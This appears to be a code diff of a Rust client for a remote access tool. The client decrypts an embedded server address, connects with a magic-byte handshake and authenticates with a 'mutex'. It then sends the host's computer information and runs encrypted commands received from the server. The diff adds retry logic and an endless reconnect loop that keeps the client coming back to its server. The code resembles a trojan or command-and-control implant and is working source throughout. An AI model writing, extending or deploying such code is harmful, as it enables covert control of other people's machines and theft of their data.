@@ -106,7 +106,7 @@ fn decrypt(
     let ciphertext = &config_trimmed[44..]; // encrypted config is the rest of the bytes
 
     let cipher = Aes256Gcm::new(key); // make cipher to decrypt the config, we will scaffold real encryption later on, no point yet
-                                      // because connection to server is not guaranteed
+    // because connection to server is not guaranteed
     let config = cipher
         .decrypt(nonce, ciphertext) // try to decrypt the config using the nonce and the cipher we just made
         .map_err(|e| e.to_string())
@@ -120,66 +120,101 @@ fn decrypt(
 /////////////////////////
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let config_buffer = config()?; // load the key+nonce+config
-    let (config, _key) = decrypt(&config_buffer)?; // decrypt the config
-    let socket = format!("{0}:{1}", &config.address, &config.port); // string of server address
+    let config_buffer = config()?;
+    let (config, _key) = decrypt(&config_buffer)?;
+    let socket = format!("{0}:{1}", &config.address, &config.port);
 
-    smol::block_on(async move { // enter an async scope to run async code
-        let stream = TcpStream::connect(socket).await?; // try to connect to the server
-        let (mut reader, writer) = io::split(stream);
-        let writer = Arc::new(Mutex::new(writer)); // wrapped in a mutex/arc so it can safely be shared between threads
-        // we must write to the stream from multiple threads because multiple commands can run at once. whereas we only read from the stream in one thread.
-        // the arc allows multiple pointers, cheap to clone, whereas the mutex (not to be confused with a client mutex) locks the writer so one thread can write to it at a time
+    smol::block_on(async move {
+        let mut connected = false;
+        for attempt in 1..=5 { // on first connection, only try 5 times
+            println!("[*][main] connection attempt #{}", attempt);
+            match try_connect(&socket, &config, _key).await {
+                Ok(_) => {
+                    connected = true;
+                    break;
+                }
+                Err(e) => {
+                    println!("[x][main] attempt #{} failed: {}", attempt, e);
+                    if attempt < 5 {
+                        smol::Timer::after(std::time::Duration::from_secs(10)).await;
+                    }
+                }
+            }
+        }
 
-        println!("[*][main] sending handshake");
+        if !connected {
+            println!("[x][main] connection could not be made to server, closing");
+            return Err("failed to connect on startup".into());
+        }
+
+        loop { // reconnect loop
+            println!("[*][main] entering reconnect loop - waiting 10s");
+            smol::Timer::after(std::time::Duration::from_secs(10)).await;
+            match connect(&socket, &config, _key).await {
+                Ok(_) => println!("[*][main] clean disconnect - still reconnect anyway"),
+                // must implement 'Disconnect' in the server closing the client completely, killing the task
+                // make it a command instead. this won't take long. it'll just run `std::process::exit(0)`
+                Err(e) => println!("[x][main] reconnect failed: {}", e),
+            }
+        }
+    })
+}
+
+async fn connect(
+    socket: &str,
+    config: &ClientConfig,
+    key: &GenericArray<u8, U32>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let stream = TcpStream::connect(socket).await?;
+    let (mut reader, writer) = io::split(stream);
+    let writer = Arc::new(Mutex::new(writer));
+
+    println!("[*][connect] sending handshake");
+    writer
+        .lock()
+        .await
+        .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32])
+        .await?;
+
+    println!("[*][connect] waiting for response");
+    let mut response = [0; 5];
+    reader.read_exact(&mut response).await?;
+
+    if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
+        println!("[v][connect] handshake successful; sending mutex");
         writer
             .lock()
             .await
-            .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32]) // send magic packets to the server that identify us as a client
+            .write_all(config.mutex.as_slice())
             .await?;
-        println!("[*][main] waiting for response"); // if we're connecting to a server, it'll respond with its own magic packets
-        let mut response = [0; 5];
-        reader.read_exact(&mut response).await?;
+    } else {
+        println!("[x][connect] handshake failed");
+        return Err("failed handshake with server".into());
+    }
 
-        if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] { // the same byte sequence but reversed
-            println!("[v][main] handshake successful; sending mutex");
-            writer
-                .lock()
-                .await
-                .write_all(config.mutex.as_slice()) // now we send our mutex to the server so it can authenticate us
-                //                                     it will be in the server whitelist if we are supposed to be connecting
-                .await?;
-        } else {
-            println!("[x][main] handshake failed");
-            return Err("Failed handshake with server".into());
-        }
+    let encryption = Encryption::new(key);
 
-        let encryption = Encryption::new(_key); // remaking our encryption struct here because we're in a different scope from decrypting the config
-        // this one gets passed on because it's used to encrypt and decrypt our responses and server's commands.
-
-        if let Ok(res) = computer_info::main() { // get our computer info. returns a result so is wrapped in an if Ok().
-            let computer_info_payload = BaseResponse { // this is the first response we will send to the server
-                id: 0,
-                response: res, // data from the computer_info payload
-            };
-            let _ = send( // 'let _' ignores the result
-                &mut *writer.lock().await, // lock our tcpstream writer so we can send our 'response'
-                &encryption, // need to point to our encryption struct so the function can encrypt our response
-                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(), // the data from the payload encoded w/ bincode
-            )
-            .await;
-        } else {
-            println!("[x][main] failed to run computer_info::main");
-        }
-
-        match wait(reader, writer, encryption).await { // enter a loop of receiving server commands
-            Ok(_) => println!("[*][main] loop exited gracefully"),
-            Err(e) => println!("[x][main] error waiting for response: {}", e),
+    if let Ok(res) = computer_info::main() {
+        let computer_info_payload = BaseResponse {
+            id: 0,
+            response: res,
         };
+        let _ = send(
+            &mut *writer.lock().await,
+            &encryption,
+            bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
+        )
+        .await;
+    } else {
+        println!("[x][connect] failed to run computer_info::main");
+    }
 
-        println!("[v][main] closing");
-        Ok(())
-    })
+    match wait(reader, writer, encryption).await {
+        Ok(_) => println!("[*][connect] wait loop exited gracefully"),
+        Err(e) => println!("[x][connect] wait loop error: {}", e),
+    }
+
+    Ok(())
 }
 
 async fn send(
@@ -220,11 +255,12 @@ async fn wait(
     let stream_writer = writer.clone(); // arc pointer, so cheap to clone. moves into new thread
     let encryption_writer = encryption.clone(); // another arc pointer to encryption
     smol::spawn(async move {
-        while let Ok(response_data) = response_rx.recv().await { // response_rx is moved to a new thread here
+        while let Ok(response_data) = response_rx.recv().await {
+            // response_rx is moved to a new thread here
             // we use response_rx to anticipate the response of a command when it's completed running
             if let Err(e) = send(
                 &mut *stream_writer.lock().await, // so is the writer clone
-                &encryption_writer, // so is the encryption clone...
+                &encryption_writer,               // so is the encryption clone...
                 response_data,
             )
             .await
@@ -236,22 +272,25 @@ async fn wait(
     })
     .detach(); // allow it to run independently
 
-    loop { // the main thread now falls into this loop
-        match shared::net::read(&mut reader).await { // where we wait for data over the tcp stream
+    loop {
+        // the main thread now falls into this loop
+        match shared::net::read(&mut reader).await {
+            // where we wait for data over the tcp stream
             Ok(buf) => {
                 // println!("[*][wait] reading data from server");
                 let mut nonce = [0u8; 12]; // make space for nonce
                 nonce.copy_from_slice(&buf[..12]); // read nonce from the first 12 bytes of the data
                 let buffer = &buf[12..]; // the rest is encrypted data
-                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) { // decrypt using nonce+data
+                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
+                    // decrypt using nonce+data
                     let (command, _size): (BaseCommand, usize) =
                         bincode::decode_from_slice(&decrypted, bincode::config::standard())
                             .unwrap(); // decode to make it a struct using bincode
 
                     let response_tx = response_tx.clone(); // clone sender so we can move it into our new thread that handles the command
                     active.spawn(command, response_tx).await; // spawn the command in the active commands handler, keeping track of it.
-                    // we pass through the response_tx variable because when the command sends its response through the channel when done
-                    // and 'tx' is connected to 'rx' since response_rx will receive this response and send it over tcp.
+                // we pass through the response_tx variable because when the command sends its response through the channel when done
+                // and 'tx' is connected to 'rx' since response_rx will receive this response and send it over tcp.
                 } else {
                     println!("[x][wait] decryption failed");
                 }
